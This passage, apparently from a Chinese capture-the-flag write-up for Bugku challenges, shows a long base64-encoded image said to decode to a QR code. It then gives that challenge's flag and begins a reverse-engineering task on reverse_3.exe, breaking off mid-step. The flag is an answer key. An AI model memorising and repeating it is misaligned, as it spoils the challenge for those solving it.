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 是一个base64的照片格式，还原扫码得到flag:bugku{inde_9882ihsd8-0} love下载下来发现一个reverse_3.exe文件，运行之后提示“没有相应的动态链接库”，查看文件类型 